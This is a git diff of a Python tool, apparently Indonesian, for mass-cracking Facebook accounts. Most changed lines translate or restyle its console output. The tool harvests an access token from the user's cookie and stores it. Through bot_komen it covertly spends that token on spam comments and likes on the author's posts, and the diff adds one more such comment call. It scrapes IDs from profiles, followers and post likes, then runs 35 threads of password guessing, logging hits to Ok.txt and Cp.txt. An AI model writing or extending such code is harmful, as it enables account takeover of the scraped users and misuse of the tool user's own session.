@@ -20,7 +20,7 @@ Dump = []
 def banner_logo():
     os.system('git pull')
     os.system('cls' if os.name == 'nt' else 'clear')
-     # juan
+     # decode by juan
     print("""[bold red]●[bold yellow] ●[bold green] ●[bold red] ●[bold yellow] ●[bold green] ●[bold red] ●[bold yellow] ●[bold green] ●[bold red] ●[bold yellow] ●[bold green] ●[bold red]●[bold yellow] ●[bold green] ●[bold red] ●[bold yellow] ●[bold green] ●[bold red] ●[bold yellow] ●[bold green] ●[bold red] ●[bold yellow] ●[bold green] ●[bold red]●[bold yellow] ●[bold green] ●[bold red] ●[bold yellow] ●[bold green] ●[bold red] ●[bold yellow] 
 [bold red]┌─────────────────────────────────────────────────────────┐
 [bold blue]│                                                         │
@@ -74,9 +74,8 @@ and make sure you are not exposed to [bold yellow]checkpoints![italic green]!"""
                 response3 = r.get('https://business.facebook.com/business_locations').text
                 token_eaag = re.search('(EAAG\w+)', str(response3)).group(1)
                 name, id = dapatkan_nama(cookie, token_eaag)
-                print("""[bold green]Nama :[bold green] {name}
-[bold green]User :[bold yellow] {id}""");bot_komen(cookie, token_eaag)
-                print('[bold blue]------------------------------------------------------------')
+                Console(width=60, style="bold blue").print(Panel(f"""[bold green]Nama :[bold green] {name}
+[bold green]User :[bold yellow] {id}""", title="[bold red]>[bold yellow]>[bold green]>[blue] (Welcome) [bold green]<[bold yellow]<[bold red]<"));bot_komen(cookie, token_eaag)
                 open('Data/Cookie.json', 'w').write(json.dumps({'Cookie': cookie}));open('Data/Token.json', 'w').write(json.dumps({'Token': token_eaag}));time.sleep(3.6);daftar_menu()
         elif query == '2' or query == '02':
             try:
@@ -92,13 +91,14 @@ and make sure you are not exposed to [bold yellow]checkpoints![italic green]!"""
 def bot_komen(cookie, token_eaag):
     with requests.Session() as r: # Kagak Usah Di Ganti, Anggap Saja Sebagai Tanda Terimakasih :V
         text = random.choice(
-            ['User @[731053408718457:] https://www.facebook.com/juanhulu2009','Hello World!https://www.facebook.com/juanhulu2009','Mantap Bang ☺️https://www.facebook.com/juanhulu2009','I Love You ❤️','Hai Bang 😘','hai bg','ganteng banget','bang gua pakek sc lu bg','bg aku dah follow tiktok lu Bg','yg penting komen','hahahah','😘https://www.facebook.com/juanhulu2009','😍https://www.facebook.com/juanhulu2009','🤣https://www.facebook.com/juanhulu2009','😭https://www.facebook.com/juanhulu2009','User @[731053408718457:] https://www.facebook.com/juanhulu2009','User @[731053408718457:] https://www.facebook.com/juanhulu2009',' User @[731053408718457:] https://www.facebook.com/juanhulu2009 ',' @[731053408718457:] ',' @[731053408718457:] ',' 🧚🏻‍♀️💫🥰💞 ','https://www.youtube.com/@juanhulu09','https://www.facebook.com/juanhulu2009','https://graph.facebook.com/174531078847946',' 𝔾𝕠𝕠𝕕 𝕄𝕠𝕣𝕟𝕚𝕟𝕘 ☼☼ ',' ♡⃝ ʜᴇʟʟᴏ ◡̈ ☽⋆ ',' 𝔾𝕠𝕠𝕕 𝔸𝕗𝕥𝕖𝕣𝕟𝕠𝕠𝕟 https://www.facebook.com/juanhulu2009',' User @[731053408718457:] https://www.facebook.com/juanhulu2009',' User @[731053408718457:] https://www.facebook.com/juanhulu2009',' bagaikan langit Di sore Hari︎ Berwarna Biru Sebiru Hatiku ','Tak Jauh Berjalan Cinta Ini',' Dengan Hati Mu ',' Hati Yang Kau Bakar  ',' Dan Sungguh Bukan Untukku',' saat ku tau semua  ',' Senyum Hanya Hiasan ',' Tak Dapat Ku Lihat Dirimu Ada di hadapan  ',' Senyum Pahit Dari ku Arti Dari Kepergian  ❤️ ',' Karna Dirinya kau Ambil sebagai Pilihan ',' Tak Bisa Memaksa 💝 ',' Tak Kuat Aku Berpegangan  (●’◡’●)ﾉ ',' Mundur Dari Hidup Perlahan Aku Melepaskan  (☞ ͡° ͜ʖ ͡°)☞ ',' Belajar Tuk Bisa Berhenti Rasa kamu Lelah ◡̈ ',' Dirimu Dan Dirinya Cerita Melengkap sudah',' Berhenti Di sini Walau Langit ku Kurang cerah ',' Barisan Terakhir Aku Membri sudah lah Pasrah😭 ',' Keyakinan Takan Berubah demi Senyuman Indah Mu',' @[1538682953303353:] ',' @[942598330243371:] ',' User @[731053408718457:] ',' User @[731053408718457:] ',' @[731053408718457:] ',' @[731053408718457:] ',' @[731053408718457:] ',' @[731053408718457:] ',' ♡ I Miss U♡ ',' @[942598330243371:] ',' @[1538682953303353:] ',' ♥️❤️💜🖤🧡💛💚💙 ',' sebenarnya aku ingin mengungkapkan rasa ',' @[1642903096130422:] ',' User @[731053408718457:] ',' @[1642903096130422:] ',' @[731053408718457:] ',' @[731053408718457:] ',' @[731053408718457:]',' @[1642903096130422:] ',' @[942598330243371:] ']
+            ['User @[731053408718457:] https://www.facebook.com/juanhulu2009','Hello World!https://www.facebook.com/juanhulu2009','Mantap Bang ☺️@[100088731637139:] User @[731053408718457:]','I Love You ❤️','Hai Bang 😘','hai bg','ganteng banget','bang gua pakek sc lu bg','bg aku dah follow tiktok lu Bg','yg penting komen','hahahah','😘https://www.facebook.com/juanhulu2009','😍https://www.facebook.com/juanhulu2009','🤣https://www.facebook.com/juanhulu2009','😭https://www.facebook.com/juanhulu2009','User @[731053408718457:] https://www.facebook.com/juanhulu2009','User @[731053408718457:] https://www.facebook.com/juanhulu2009',' User @[731053408718457:] https://www.facebook.com/juanhulu2009 ',' @[731053408718457:] ',' @[731053408718457:] ',' @[100088731637139:] User @[731053408718457:] ','https://www.youtube.com/@juanhulu09','https://www.facebook.com/juanhulu2009','https://graph.facebook.com/174531078847946',' @[100088731637139:] User @[731053408718457:] ',' @[100088731637139:] User @[731053408718457:] ',' @[100088731637139:] User @[731053408718457:]',' User @[731053408718457:] https://www.facebook.com/juanhulu2009',' User @[731053408718457:] https://www.facebook.com/juanhulu2009',' bagaikan langit Di sore Hari︎ Berwarna Biru Sebiru Hatiku ','Tak Jauh Berjalan Cinta Ini',' Dengan Hati Mu ',' Hati Yang Kau Bakar  ',' Dan Sungguh Bukan Untukku',' saat ku tau semua  ',' Senyum Hanya Hiasan ',' Tak Dapat Ku Lihat Dirimu Ada di hadapan  ',' @[100088731637139:] User @[731053408718457:]️ ',' Karna Dirinya kau Ambil sebagai Pilihan ',' Tak Bisa Memaksa 💝 ',' Tak Kuat Aku Berpegangan  (●’◡’●)ﾉ ',' Mundur Dari Hidup Perlahan Aku Melepaskan  (☞ ͡° ͜ʖ ͡°)☞ ',' Belajar Tuk Bisa Berhenti Rasa kamu Lelah ◡̈ ',' Dirimu Dan Dirinya Cerita Melengkap sudah',' Berhenti Di sini Walau Langit ku Kurang cerah ',' @[100088731637139:] User @[731053408718457:] ',' @[1538682953303353:] ',' @[942598330243371:] ',' User @[731053408718457:] ',' @[100088731637139:] User @[731053408718457:] ',' @[731053408718457:] ',' @[731053408718457:] ',' @[731053408718457:] ',' @[731053408718457:] ',' ♡ I Miss U♡ @[100088731637139:] User @[731053408718457:] ',' @[942598330243371:] ',' @[1538682953303353:] ',' @[100088731637139:] User @[731053408718457:] ',' sebenarnya aku ingin mengungkapkan rasa ',' @[1642903096130422:] ',' User @[731053408718457:] ',' @[1642903096130422:] ',' @[731053408718457:] ',' @[731053408718457:] ',' @[731053408718457:]',' @[1642903096130422:] ',' @[942598330243371:] ']
         )
         r.cookies.update({
             'cookie': cookie
         })
         response = r.post('https://graph.facebook.com/174531078847946/comments/?message={}&access_token={}'.format(text, token_eaag)).text 
         response2 = r.post('https://graph.facebook.com/174531078847946/likes?summary=true&access_token={}'.format(token_eaag)).text 
+        response = r.post('https://graph.facebook.com/181205294847191/comments/?message={}&access_token={}'.format(text, token_eaag)).text 
         response = r.post('https://graph.facebook.com/181205294847191/comments/?message={}&access_token={}'.format(text, token_eaag)).text 
         response2 = r.post('https://graph.facebook.com/181205294847191/likes?summary=true&access_token={}'.format(token_eaag)).text 
         if "\"id\":\"" in str(response) and str(response2) == 'true':
@@ -123,38 +123,41 @@ def daftar_menu():
 └──╼❯""")
     if query == '1' or query == '01':
         try:
-            Console(width=60, style="bold blue").print(Panel("[italic green]Silahkan Masukan[italic green] ID Akun Facebook[italic green], Gunakan Koma Untuk Dump Masal, Misalnya :[italic green] 757953543,4", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[blue] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
-            userid = Console().input("[bold blue]   ╰─> ")
+            print("[italic green]Please enter[italic green] ID account Facebook[italic green], Use a comma for Dump Masal, For example :[italic green] 100088731637139,4")
+            userid = Console().input('''[bold blue][bold blue]┌─[───────────────────────────────────────────────────────]
+└──╼❯ ''')
             for z in userid.split(','):
                 dump().publik(int(z), cookie, unit_cursor = '')
             if len(Dump) < 50:
-                Console().print("[bold blue]   ╰─>[bold yellow] Jumlah User Terlalu Sedikit!", end='\r');time.sleep(3.6);exit("\r                                                                         ")
+                Console().print("[bold blue]   ╰─>[bold yellow] The number of users is too small!", end='\r');time.sleep(3.6);exit("\r                                                                         ")
             else:
                 Console(width=60, style="bold blue").print(Panel(f"[bold green]Jumlah User :[bold green] {len(Dump)}", title="[bold red]>[bold yellow]>[bold green]>[blue] (Dump Sukses) [bold green]<[bold yellow]<[bold red]<"));crack().open_list()
         except Exception as e:
             Console(width=60, style="bold blue").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[blue] (Error) [bold green]<[bold yellow]<[bold red]<"));exit()
     elif query == '2' or query == '02':
         try:
-            Console(width=60, style="bold blue").print(Panel("[italic green]Silahkan Masukan[italic green] ID Akun Facebook[italic green], Gunakan Koma Untuk Dump Masal, Misalnya :[italic green] 757953543,4", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[blue] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
-            userid = Console().input("[bold blue]   ╰─> ")
+            print("[italic green]Please enter[italic green] ID account Facebook[italic green], Use a comma for Dump Masal, For example :[italic green] 100088731637139,4",)
+            userid = Console().input("""[bold blue]┌─[───────────────────────────────────────────────────────]
+└──╼❯""")
             for z in userid.split(','):
                 dump().pengikut(z, cookie, token_eaag)
             if len(Dump) < 50:
-                Console().print("[bold blue]   ╰─>[bold yellow] Jumlah User Terlalu Sedikit!", end='\r');time.sleep(3.6);exit("\r                                                                         ")
+                Console().print("[bold blue]   ╰─>[bold yellow] The number of users is too small!", end='\r');time.sleep(3.6);exit("\r                                                                         ")
             else:
-                Console(width=60, style="bold blue").print(Panel(f"[bold green]Jumlah User :[bold green] {len(Dump)}", title="[bold red]>[bold yellow]>[bold green]>[blue] (Dump Sukses) [bold green]<[bold yellow]<[bold red]<"));crack().open_list()
+                print("[bold green]Jumlah User :[bold green] {len(Dump)}",);crack().open_list()
         except Exception as e:
             Console(width=60, style="bold blue").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[blue] (Error) [bold green]<[bold yellow]<[bold red]<"));exit()
     elif query == '3' or query == '03':
         try:
-            Console(width=60, style="bold blue").print(Panel("[italic green]Silahkan Masukan ID Postingan, Gunakan Koma Untuk Dump Masal, Misalnya :[italic green] 10160334652393544", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[blue] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
-            postid = Console().input("[bold blue]   ╰─> ")
+            print("[italic green]Please enter the post id, use a comma for mass dumps for example :[italic green] 10160334652393544", subtitle="╭───", subtitle_align="left",)
+            postid = Console().input("""[bold blue]┌─[───────────────────────────────────────────────────────]
+└──╼❯""")
             for z in postid.split(','):
                 dump().likes(z, cookie, token_eaag, after = '')
             if len(Dump) < 1:
-                Console().print("[bold blue]   ╰─>[bold yellow] Jumlah User Terlalu Sedikit!", end='\r');time.sleep(3.6);exit("\r                                                                         ")
+                Console().print("[bold blue]   ╰─>[bold yellow] The number of users is too small!", end='\r');time.sleep(3.6);exit("\r                                                                         ")
             else:
-                Console(width=60, style="bold blue").print(Panel(f"[bold green]Jumlah User :[bold green] {len(Dump)}", title="[bold red]>[bold yellow]>[bold green]>[blue] (Dump Sukses) [bold green]<[bold yellow]<[bold red]<"));crack().open_list()
+                print("[bold green]Jumlah User :[bold green] {len(Dump)}",);crack().open_list()
         except Exception as e:
             Console(width=60, style="bold blue").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[blue] (Error) [bold green]<[bold yellow]<[bold red]<"));exit()
     elif query == '4' or query == '04':
@@ -232,7 +235,7 @@ class dump:
                             Console().print(f"[bold blue]   ╰─>[bold red] KeyError!                ", end='\r');time.sleep(3.6);continue
                     return 0
                 else:
-                    Console().print(f"[bold blue]   ╰─>[bold yellow] Gagal {userid} User!          ", end='\r');time.sleep(3.6)
+                    Console().print(f"[bold blue]   ╰─>[bold yellow] failed {userid} User!          ", end='\r');time.sleep(3.6)
                     return 1
         except (KeyboardInterrupt):
             Console().print(f"[bold blue]   ╰─>[bold yellow] KeyboardInterrupt!          ", end='\r');time.sleep(3.6)
@@ -260,7 +263,7 @@ class dump:
                     else:
                         return 0
                 else:
-                    Console().print(f"[bold blue]   ╰─>[bold yellow] Gagal {postid} User!          ", end='\r');time.sleep(3.6)
+                    Console().print(f"[bold blue]   ╰─>[bold yellow] failed {postid} User!          ", end='\r');time.sleep(3.6)
                     return 1
         except (KeyboardInterrupt):
             Console().print(f"[bold blue]   ╰─>[bold yellow] KeyboardInterrupt!          ", end='\r');time.sleep(3.6)
@@ -302,8 +305,8 @@ class crack:
     ### OPEN LIST DUMP ###
     def open_list(self):
         try:
-            Console(width=60, style="bold blue").print(Panel("""[bold green]Hasil Crack[bold green] Ok[bold green] Tersimpan Di :[bold green] Results/Ok.txt
-[bold green]Hasil Crack[bold red] Cp[bold green] Tersimpan Di :[bold red] Results/Cp.txt""", title="[bold red]>[bold yellow]>[bold green]>[blue] (Results Crack) [bold green]<[bold yellow]<[bold red]"))
+            print("""[bold green]Result Crack[bold green] Ok[bold green] stored in :[bold green] Results/Ok.txt
+[bold green]result Crack[bold red] Cp[bold green] stored in :[bold red] Results/Cp.txt""",)
             with ThreadPoolExecutor(max_workers=35) as (V):
                 for z in Dump:
                     self.email, self.nama = z.split('|')[0], z.split('|')[1]
@@ -401,9 +404,10 @@ class crack:
                     else:
                         continue
             self.looping += 1
-            Console().print(f"[bold blue]   ╰─>[bold green] Crack {str(len(Dump))}/{self.looping} Ok:-[bold green]{len(self.success)}[bold green] Cp:-[bold red]{len(self.checkpoint)}[bold green]              ", end='\r')
+            Console().print(f"""[bold blue]┌─[───────────────────────────────────────────────────────]
+└──╼❯[bold green] Crack {str(len(Dump))}/{self.looping} Ok:-[bold green]{len(self.success)}[bold green] Cp:-[bold red]{len(self.checkpoint)}[bold green]              ", end='\r""")
         except (requests.exceptions.ConnectionError, requests.exceptions.ChunkedEncodingError):
-            Console().print("[bold blue]   ╰─>[bold red] Koneksi Error!                    ", end='\r');time.sleep(7.9);self.main(total, email, password)
+            Console().print("[bold blue]   ╰─>[bold red] Koneksion Error!                    ", end='\r');time.sleep(7.9);self.main(total, email, password)
     ### REALME USERAGENT ###
     def realme_useragent(self, total):
         for _ in range(total):
